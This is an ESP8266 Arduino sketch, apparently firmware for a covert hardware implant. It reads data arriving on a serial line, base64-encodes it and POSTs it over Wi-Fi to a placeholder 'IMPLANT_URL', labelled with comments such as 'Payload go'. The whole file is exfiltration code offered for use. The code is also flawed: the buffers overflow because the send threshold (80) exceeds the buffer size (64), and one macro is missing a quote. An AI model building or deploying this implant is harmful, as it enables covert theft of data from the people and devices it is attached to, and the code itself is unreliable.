#include <ESP8266HTTPClient.h>
#include <ESP8266WiFi.h>
#include <base64.hpp>

#define BUFSIZE 64
#define SENDTHRESH 80

#define IMPLANT_URL "http://<URL>"

#define CALLBACK_AP <AP>"
#define CALLBACK_PASS "<PASS>"

int readHead = 0;
char readBuf[BUFSIZE];

int enclen = 0;
char encBuf[BUFSIZE * 2];

HTTPClient http;

int delayCtr = 0;

void setup() {
  Serial.begin(9600);
  WiFi.mode(WIFI_STA);
  Serial.println("STarting...");
  WiFi.begin(CALLBACK_AP,CALLBACK_PASS);
  
  while (WiFi.status() != WL_CONNECTED) {
      delay(10000);
      delayCtr += 1;
      Serial.println("Blocking...");
  }
}

int base64;

void loop() {
  int delayCtr = 0;
  while(Serial.available() == 0){};
  readBuf[readHead++] = Serial.read();
  while(Serial.available() == 0){};
  readBuf[readHead++] = Serial.read();
  // don't know what other trash characters might come
  if(readHead > SENDTHRESH)
  {
    Serial.println("SENDTHRESH reached");
    if(WiFi.status() != WL_CONNECTED)
    {
      WiFi.disconnect();
      WiFi.begin(CALLBACK_AP,CALLBACK_PASS);
      delayCtr = 0;
    }
    while (WiFi.status() != WL_CONNECTED) {
      delay(500);
      delayCtr += 1;
      Serial.println("Blocking...");
      if(delayCtr == 5)
      {
        delayCtr = 0;
        goto nevermind;
      }
    }
    // Serial.print(".");
    Serial.println("Payload go");
    http.begin(IMPLANT_URL);
    http.addHeader("Content-Type", "text/plain");
    enclen = encode_base64((unsigned char *)readBuf, readHead + 1, (unsigned char *)encBuf);
    encBuf[enclen] = 0;
    http.POST(encBuf);
    Serial.println("Bye!");
    // WiFi.disconnect();
    nevermind:;
    readHead = 0;
    // WiFi.mode(WIFI_OFF);
  }
}
